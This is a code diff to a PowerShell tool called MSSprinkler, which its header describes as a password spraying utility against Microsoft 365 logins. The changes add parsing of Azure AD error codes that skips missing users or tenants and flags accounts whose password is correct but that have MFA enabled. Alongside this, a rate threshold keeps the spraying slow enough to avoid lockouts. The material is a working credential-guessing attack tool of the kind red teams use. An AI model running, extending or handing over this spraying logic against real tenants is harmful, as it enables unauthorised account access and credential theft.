@@ -1,33 +1,33 @@
 function Invoke-MSSprinkler{
-<#
-.Synopsis
-    MSSprinkler is a password spraying utility that targets M365 accounts. It employs a 'low-and-slow' approach to avoid locking out accounts, and provides verbose information related to accounts / tenant information.
+    <#
+    .Synopsis
+        MSSprinkler is a password spraying utility that targets M365 accounts. It employs a 'low-and-slow' approach to avoid locking out accounts, and provides verbose information related to accounts / tenant information.
 
-.Description
-    Version: 0.1
-    Author: Connor Jackson
-    GitHub: https://github.com/theresafewconors/mssprinkler
+    .Description
+        Version: 0.1
+        Author: Connor Jackson
+        GitHub: https://github.com/theresafewconors/mssprinkler
 
-.Parameter user
-    A list of users to spray. One per line without commas. eg. user@tenant.com. Provide the path to the file.
-.Parameter pass
-    A list of passwords to use. One per line without commas. Provide the path to the file.
-.Parameter threshold
-    The threshold for the maximum number of attempts to make per min. Default is 8 if no value is provided.
-.Parameter URL
-    URL to target. This will default to 'https://login.microsoftonline.com' if no value is provided.
+    .Parameter user
+        A list of users to spray. One per line without commas. eg. user@tenant.com. Provide the path to the file.
+    .Parameter pass
+        A list of passwords to use. One per line without commas. Provide the path to the file.
+    .Parameter threshold
+        The threshold for the maximum number of attempts to make per min. Default is 8 if no value is provided.
+    .Parameter URL
+        URL to target. This will default to 'https://login.microsoftonline.com' if no value is provided.
 
-.Example
-    Invoke-MSSprinkler -user .\users.txt -pass .\passwords.txt -threshold 12
-    Invoke-MSSprinkler -us .\users.txt -p .\passwords.txt -t 12
-#>
+    .Example
+        Invoke-MSSprinkler -user .\users.txt -pass .\passwords.txt -threshold 12
+        Invoke-MSSprinkler -us .\users.txt -p .\passwords.txt -t 12
+    #>
 
 Param(
     [string]$user,
     [string]$pass,
     [int]$threshold = 8,
     [string]$url = 'https://login.microsoftonline.com'
-)
+    )
 
 # Create a list of usernames
 $usernames = Get-Content $user
@@ -40,6 +40,9 @@ Write-Host "Expected time to complete is" $exptime "mins"
 <#
 ToDo:
     - Verbose MFA info
+        - MS: DONE
+        - Duo: Done
+        - Google Auth: To do 
     - CSV Output
 #>
 
@@ -79,8 +82,19 @@ for ($counter=0; $counter -lt $usernames.length; $counter++) {
             # Invalid Username
             ElseIf($errRes -match "AADSTS50034")
             {
-                #Write-Output "[*] WARNING! The user $counter doesn't exist. Skipping."
                 Write-Host -ForegroundColor "yellow" "    $un doesn't exist, skipping further attempts.."
+                break
+            }
+            # Invalid Tenant
+            ElseIf($errRes -match "AADSTS50059")
+            {
+                Write-Host "    Supplied tenant for $un doesn't exist, skipping further attempts.."
+                break
+            }
+            # MFA
+            ElseIf($errRes -match "AADSTS50076")
+            {
+                Write-Host -ForegroundColor "Cyan" "[*] Password for $un is correct but user has MFA enabled (DUO or MS)"
                 break
             }
         }
@@ -101,8 +115,7 @@ $errorResonseValues = @{
     AADSTS50126 = "Invalid username or password" # standard failed password?
     AADSTS50128 = "Invalid domain name / Tenant does not exist"
     # MFA Responses
-    AADSTS50079 = "MFA detected for user (Microsoft)"
+    AADSTS50076 = "MFA detected for user (DUO & Microsoft)"
     AADSTS50158 = "MFA detected for user (External Application)"
-}
-
+    }
 }
